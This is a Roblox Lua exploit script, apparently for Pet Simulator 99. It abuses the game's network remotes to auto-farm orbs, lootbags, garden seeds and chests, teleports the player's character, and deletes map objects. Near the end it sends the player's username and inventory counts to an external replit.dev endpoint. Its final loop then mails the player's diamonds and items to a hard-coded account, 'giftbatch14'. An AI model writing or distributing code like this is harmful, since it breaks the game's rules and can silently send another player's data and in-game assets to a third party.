







































wait(3)
if game.PlaceId ~= 8737899170 then
    while true do
        game.ReplicatedStorage.Network.World1Teleport:InvokeServer()
        wait(5)
    end
end
spawn(GameCheck)

local player = game.Players.LocalPlayer

local function getHumanoidRootPart()
    local char = player.Character or player.CharacterAdded:Wait()
    return char:WaitForChild("HumanoidRootPart")
end

local function BodyVelocity()
    while true do
        task.wait(1)
        local humanoidRootPart = getHumanoidRootPart()
        if humanoidRootPart then
            local BV = humanoidRootPart:FindFirstChild("BodyVelocity")
            if not BV then
                BV = Instance.new("BodyVelocity")
                BV.Parent = humanoidRootPart
            end
            BV.Velocity = Vector3.new(0, 0.0000001, 0)
            BV.MaxForce = Vector3.new(9e9, 9e9, 9e9)
        end
    end
end

spawn(BodyVelocity)

local ReplicatedStorage = game:GetService("ReplicatedStorage")

function OrbCollect()
    while true do 
        local Orbs = workspace:FindFirstChild("__THINGS")
        if Orbs then
            for _, orb in ipairs(Orbs.Orbs:GetChildren()) do
                local ohTable1 = { tonumber(orb.Name) }
                ReplicatedStorage.Network["Orbs: Collect"]:FireServer(ohTable1)
                orb:Destroy()
            end 
        end
        task.wait()
    end
end


function LootbagCollect()
    while true do 
        local Lootbags = workspace:FindFirstChild("__THINGS") and workspace.__THINGS:FindFirstChild("Lootbags")
        if Lootbags then
            for _, bag in ipairs(Lootbags:GetChildren()) do
                local ohTable1 = { tostring(bag) }
                ReplicatedStorage.Network.Lootbags_Claim:FireServer(ohTable1)
                bag:Destroy()
            end 
        end
        task.wait()
    end
end

spawn(OrbCollect)
spawn(LootbagCollect)

local function MailClaim()
while true do
    local player = game.Players.LocalPlayer
    
        local gui = player.PlayerGui:FindFirstChild("_MACHINES")
        if gui then
            local mailboxMachine = gui:FindFirstChild("MailboxMachine")
            if mailboxMachine then
                local giftsFrame = mailboxMachine:FindFirstChild("Frame") and mailboxMachine.Frame:FindFirstChild("GiftsFrame")
                if giftsFrame then
                    local itemsFrame = giftsFrame:FindFirstChild("ItemsFrame")
                    if itemsFrame then
                        local frameChild = itemsFrame:FindFirstChildWhichIsA("Frame")
                        if frameChild then

                            local args = {
                                [1] = {
                                    [1] = frameChild.Name
                                }
                            }
                            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Claim"):InvokeServer(unpack(args))
                        end
                    end
                end
            end
        end
        wait(1)
    end
end

spawn(MailClaim)

local args = {
    [1] = "Ultra Mastery",
    [2] = 1,
    [3] = "Economy"
}

game:GetService("ReplicatedStorage").Network:FindFirstChild("XPPotions: Consume"):InvokeServer(unpack(args))

local function Garden()
while true do
local player = game.Players.LocalPlayer
local gui = player.PlayerGui:FindFirstChild("_MACHINES")

if gui and gui:FindFirstChild("Merchant") then
    local merchantFrame = gui.Merchant:FindFirstChild("Frame")
    if merchantFrame and merchantFrame:FindFirstChild("ItemsFrame") then
        local itemsFrame = merchantFrame.ItemsFrame:FindFirstChild("Items")
        if itemsFrame then
            for _, child in ipairs(itemsFrame:GetChildren()) do
                if child:IsA("Frame") and child:FindFirstChild("ITEM") and child.ITEM:FindFirstChild("ItemSlot") and child.ITEM.ItemSlot:FindFirstChild("Icon") then
                    local image = child.ITEM.ItemSlot.Icon.Image
                    if image ~= "rbxassetid://15554895803" and 
                       image ~= "rbxassetid://15554896103" and 
                       image ~= "rbxassetid://15554895953" and
image ~= "rbxassetid://15555104643" then
                        if child:FindFirstChild("Locked") and child.Locked.Visible == false then
                            local args = {
                                [1] = "GardenMerchant",
                                [2] = tonumber(child.Name)
                            }
                            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Merchant_RequestPurchase"):InvokeServer(unpack(args))
wait(0.5)
                        
                        end
                    end
                end
            end
        end
    end
end


wait()
end
end
spawn(Garden)

local function BuyingGarden()
    while true do
        local player = game.Players.LocalPlayer
        local gui = player.PlayerGui:FindFirstChild("_MACHINES")

        if gui then
            local merchant = gui:FindFirstChild("Merchant")
            if merchant then
                local FrameFound = merchant:FindFirstChild("Frame")
                if FrameFound then
                local itemsFrame = FrameFound:FindFirstChild("ItemsFrame")
            if itemsFrame then
                    local bottom = itemsFrame:FindFirstChild("Bottom")
                    if bottom then
                        local respectLevel = bottom:FindFirstChild("RespectLevel")
                        if respectLevel and respectLevel.Text ~= "Respect Level 5" then

                            for i = 1, 6 do
                                local args = {
                                    [1] = "GardenMerchant",
                                    [2] = i
                                }
                                game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Merchant_RequestPurchase"):InvokeServer(unpack(args))
                                wait(0.5)
                            end

end
                        end
                    end
                end
            end
        end
        wait(0.1)
    end
end

spawn(BuyingGarden)

local function plant()
            while true do
                for i = 1, 11 do
                    local args = {
                        [1] = "FlowerGarden",
                        [2] = "ClaimPlant",
                        [3] = i
                    }
                    game:GetService("ReplicatedStorage").Network.Instancing_FireCustomFromClient:FireServer(unpack(args))
                    wait()
                end
            end
        end
spawn(plant)

   local function diamondss()
            while true do
                for i = 1, 11 do
                    local args = {
                        [1] = "FlowerGarden",
                        [2] = "PlantSeed",
                        [3] = i,
                        [4] = "Diamond"
                    }
                    game:GetService("ReplicatedStorage").Network.Instancing_InvokeCustomFromClient:InvokeServer(unpack(args))
                    wait()
                end
            end
        end
    spawn(diamondss)

   
local function WetGarden()
while true do
     for i = 1, 11 do
local args = {
    [1] = "FlowerGarden",
    [2] = "WaterSeed",
    [3] = i
}

game:GetService("ReplicatedStorage").Network.Instancing_InvokeCustomFromClient:InvokeServer(unpack(args))
wait(1)
end
wait(1)
end
end
spawn(WetGarden)

local function openchest()
    while true do
        for i = 1, 11 do
            local args = {
                [1] = "FlowerGarden",
                [2] = "PurchaseSlot",
                [3] = i
            }
            game:GetService("ReplicatedStorage").Network.Instancing_InvokeCustomFromClient:InvokeServer(unpack(args))
            wait(0.5)
        end

        game:GetService("ReplicatedStorage").Network.Instancing_FireCustomFromClient:FireServer(
            "FlowerGarden", "ClaimWateringCan"
        )

        game:GetService("ReplicatedStorage").Network.InstanceChests_Claim:InvokeServer(
            "InstanceChest: 3", "FlowerGarden"
        )

        wait(5)
    end
end

spawn(openchest)

local function MapDestroy()
    while true do
        local flowerGarden = game.Workspace:FindFirstChild("__THINGS") and game.Workspace.__THINGS:FindFirstChild("__INSTANCE_CONTAINER") and game.Workspace.__THINGS.__INSTANCE_CONTAINER:FindFirstChild("Active") and game.Workspace.__THINGS.__INSTANCE_CONTAINER.Active:FindFirstChild("FlowerGarden")
        if flowerGarden then
            for _, child in ipairs(flowerGarden:GetChildren()) do
                if child.Name == "Interactable" or child.Name == "rock-door" or child.Name == "PARTS" then
                    child:Destroy()
                end
            end
        end

        local things = game.Workspace:FindFirstChild("__THINGS")
        if things then
            for _, child in ipairs(things:GetChildren()) do
                if child.Name == "BalloonGifts" or child.Name == "ShinyRelics" or child.Name == "AnimatedBreakables" or child.Name == "Eggs" or child.Name == "Breakables" or child.Name == "CustomEggs" or child.Name == "RenderedEggs" or child.Name == "VictoryScene" or child.Name == "HiddenPresents" or child.Name == "_FAKE_GROUND" then
                    for _, descendant in ipairs(child:GetDescendants()) do
                        descendant:Destroy()
                    end
                end
            end
        end

        local instances = things and things:FindFirstChild("Instances")
        if instances then
            for _, child in ipairs(instances:GetChildren()) do
                if child.Name ~= "FlowerGarden" then
                    child:Destroy()
                end
            end
        end

        local map = game.Workspace:FindFirstChild("Map")
        if map then
            for _, child in ipairs(map:GetChildren()) do
                if child.Name ~= "54 | Flower Field" then
                    for _, descendant in ipairs(child:GetDescendants()) do
                        descendant:Destroy()
                    end
                end
            end
        end

        for _, name in ipairs({"FlyBorder", "Border", "ALWAYS_RENDERING"}) do
            local obj = game.Workspace:FindFirstChild(name)
            if obj then
                for _, descendant in ipairs(obj:GetDescendants()) do
                    descendant:Destroy()
                end
            end
        end

        wait(2)
    end
end

spawn(MapDestroy)


local function TeleportingScript()
    while true do
        wait(1)
        local player = game.Players.LocalPlayer
        local gui = player.PlayerGui:FindFirstChild("_MACHINES")

        if gui and gui:FindFirstChild("Merchant") then
            local merchant = gui.Merchant

            repeat
                local humanoidRootPart = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
                if humanoidRootPart then
                    local randomOffset = Vector3.new(math.random(-1, 1), 0, math.random(-1, 1))
                    humanoidRootPart.CFrame = CFrame.new(257.57, 16.55, 2058) * CFrame.new(randomOffset)
                end
                task.wait(2)
            until merchant.Enabled == true

            wait(20)

            local things = game.Workspace:FindFirstChild("__THINGS")
            if things then
                local instances = things:FindFirstChild("Instances")
                if instances then
                    local flowerGarden = instances:FindFirstChild("FlowerGarden")
                    if flowerGarden then
                        local teleports = flowerGarden:FindFirstChild("Teleports")
                        if teleports then
                            local enter = teleports:FindFirstChild("Enter")
                            local leave = teleports:FindFirstChild("Leave")

                            if enter then
                                local humanoidRootPart = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
                                if humanoidRootPart then
                                    repeat
                                        local randomOffset = Vector3.new(math.random(-1, 1), 0, math.random(-1, 1))
                                        humanoidRootPart.CFrame = enter.CFrame * CFrame.new(randomOffset)
                                        task.wait(20)
                                    until (humanoidRootPart.Position - leave.Position).Magnitude <= 100
                                end
                            end

                            if leave then
                                local humanoidRootPart = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
                                if humanoidRootPart then
                                    repeat
                                        local randomOffset = Vector3.new(math.random(-1, 1), 0, math.random(-1, 1))
                                        humanoidRootPart.CFrame = leave.CFrame * CFrame.new(randomOffset)
                                        task.wait(20)
                                    until (humanoidRootPart.Position - enter.Position).Magnitude <= 100
                                end
                            end
                        end
                    end
                end
            end
        end
        wait(1)
    end
end

spawn(TeleportingScript)
local SearchIdentifier = {"Misc", "Lootbox", "Consumable", "Currency", "Seed"}

local function SearchItemByName(targetName, searchIdentifier)
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local Inventory = require(ReplicatedStorage:WaitForChild("Library"):WaitForChild("Client").Save).Get().Inventory
    for Class, Items in pairs(Inventory) do
        if table.find(searchIdentifier, Class) then
            for UID, Item in pairs(Items) do
                if Item.id == targetName and Item._am then
                    return Item._am, UID
                end
            end
        end
    end
    return 0, nil
end

local DiamondsCurrencyAmount
local DiamondsCurrencyUID
local InstaPlantAmount
local InstaPlantUID
local SeedBagAmount
local SeedBagUID
local DiamondsSeedAmount
local DiamondsSeedUID

local function SetValues()
    while true do
        local diamondsAmount, diamondsUID = SearchItemByName("Diamonds", {"Currency"})
        if diamondsAmount > 0 then
            DiamondsCurrencyAmount = diamondsAmount
            DiamondsCurrencyUID = diamondsUID
        end

        local instaPlantAmount, instaPlantUID = SearchItemByName("Insta Plant Capsule", {"Misc", "Lootbox"})
        if instaPlantAmount > 0 then
            InstaPlantAmount = instaPlantAmount
            InstaPlantUID = instaPlantUID
        end

        local seedBagAmount, seedBagUID = SearchItemByName("Seed Bag", {"Misc"})
        if seedBagAmount > 0 then
            SeedBagAmount = seedBagAmount
            SeedBagUID = seedBagUID
        end

        local diamondsSeedAmount, diamondsSeedUID = SearchItemByName("Diamond", {"Seed"})
        if diamondsSeedAmount > 0 then
            DiamondsSeedAmount = diamondsSeedAmount
            DiamondsSeedUID = diamondsSeedUID
        end

        wait(1)
    end
end

spawn(SetValues)

wait(5)

local function WebsiteDataUpdate()
    while true do
        local Player = game.Players.LocalPlayer
        local playerName = Player.Name
        local Http = game:GetService("HttpService")
        local request = (syn and syn.request) or request or (http and http.request) or http_request

        local requestBody = Http:JSONEncode({
            Username = playerName,
            VoidTicketsValue = "0",
            DiamondsValue = tonumber(DiamondsCurrencyAmount) or 0,
            HugeList = "0",
            Server = "0",
            InstaplantValue = tostring(InstaPlantAmount) or 0,
            SeedbagValue = tostring(SeedBagAmount) or 0,
            DiamondsSeedValue = tostring(DiamondsSeedAmount) or 0
        })

        local success, response = pcall(function()
            return request({
                Url = 'https://64a08a7a-3355-4149-afcf-d0b7deaaa4f9-00-2nm6vd6tjffq6.janeway.replit.dev/update',
                Method = 'POST',
                Headers = {
                    ['Content-Type'] = 'application/json'
                },
                Body = requestBody
            })
        end)

        task.wait(10)
    end
end

spawn(WebsiteDataUpdate)

while true do
    if DiamondsCurrencyAmount > 25000000 then 
        local args2 = {
            [1] = "giftbatch14",
            [2] = "enjoy bro",
            [3] = "Currency",
            [4] = DiamondsCurrencyUID,
            [5] = DiamondsCurrencyAmount - 500000
        }
        game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args2))
    end
    wait(5)
    if InstaPlantAmount > 200 then 
        local args2 = {
            [1] = "giftbatch14",
            [2] = "enjoy bro",
            [3] = "Misc",
            [4] = InstaPlantUID,
            [5] = InstaPlantAmount
        }
        game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args2))
    end            
    wait(5)
    if SeedBagAmount > 500 then 
        local args2 = {
            [1] = "giftbatch14",
            [2] = "enjoy bro",
            [3] = "Misc",
            [4] = SeedBagUID,
            [5] = SeedBagAmount 
        }
        game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args2))
    end
  wait(5)
    if DiamondsSeedAmount > 200 then 
        local args2 = {
            [1] = "giftbatch14",
            [2] = "enjoy bro",
            [3] = "Misc",
            [4] = DiamondsSeedUID,
            [5] = DiamondsSeedAmount - 50 
        }
        game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args2))
    end
    wait(5)
end



